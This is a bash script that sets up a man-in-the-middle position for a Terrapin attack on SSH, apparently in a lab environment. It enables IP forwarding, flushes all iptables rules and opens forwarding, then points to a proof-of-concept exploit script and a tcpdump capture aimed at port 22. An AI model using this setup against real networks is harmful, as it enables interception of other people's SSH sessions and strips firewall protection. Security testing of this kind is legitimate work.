#!/bin/bash
# MITM Setup Script for Terrapin Attack

echo "=========================================="
echo "Terrapin Attack - MITM Setup"
echo "=========================================="
echo ""

# Enable IP forwarding
echo "[+] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "    ✓ IP forwarding enabled"

# Get network information
IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
MY_IP=$(ip addr show $IFACE | grep "inet " | awk '{print $2}' | cut -d/ -f1)

echo "[+] Network configuration:"
echo "    Interface: $IFACE"
echo "    IP Address: $MY_IP"
echo ""

# Setup iptables for transparent proxy (optional)
echo "[+] Setting up iptables rules..."

# Flush existing rules
iptables -F
iptables -t nat -F

# Allow forwarding
iptables -P FORWARD ACCEPT

echo "    ✓ iptables configured"
echo ""

echo "=========================================="
echo "MITM Setup Complete!"
echo "=========================================="
echo ""
echo "You can now:"
echo "  1. Run vulnerability check:"
echo "     python3 poc_exploit/terrapin_exploit.py --target vulnerable-server --check-only"
echo ""
echo "  2. Start the attack proxy:"
echo "     python3 poc_exploit/terrapin_exploit.py --target vulnerable-server --port 22"
echo ""
echo "  3. Capture traffic:"
echo "     tcpdump -i any -w /attack/captures/attack.pcap port 22"
echo ""
